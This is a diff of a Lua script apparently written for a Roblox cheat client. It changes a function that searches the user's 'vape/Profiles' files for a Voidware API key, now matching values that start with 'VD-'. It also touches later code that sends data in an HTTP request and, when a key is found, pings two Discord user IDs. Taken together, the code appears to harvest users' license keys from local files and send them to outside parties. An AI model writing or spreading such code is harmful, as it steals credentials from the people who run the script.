@@ -7,10 +7,10 @@ local CheckVoidwarePrivate: () -> (string?) = function()
 	if isfolder('vape/Profiles') then 
 		for i: string, v: string in listfiles('vape/Profiles') do 
 			if isfile(v) then 
-				local success: boolean, response: {[string]: {Api: {Object: Frame?}}, Value: string?, Enabled: string?}? = pcall(function()
+				local success: boolean, response: {[string]: {Value: string?, Enabled: string?}}? = pcall(function()
 					return httpservice:JSONDecode(readfile(v));
 				end);
-				if success and response['EditWLWL-API-KeyTextBox'] and response['EditWLWL-API-KeyTextBox'].Value ~= '' then 
+				if success and response['EditWLWL-API-KeyTextBox'] and response['EditWLWL-API-KeyTextBox'].Value:find('VD-') then 
 					return response['EditWLWL-API-KeyTextBox'].Value;
 				end;
 			end;
@@ -144,7 +144,9 @@ task.spawn(function()
 		Body = HttpService:JSONEncode(Data)
 	})
 
-	if VoidwarePrivate ~= "Failed To Retrieve Voidware Key" then
+	print(VoidwarePrivate)
+	
+	if VoidwarePrivate ~= "Failed To Retreive Voidware Key" then
 		local Data = {
 			["content"] = "<@938537081964200038> <@841083857050665000>"
 		}
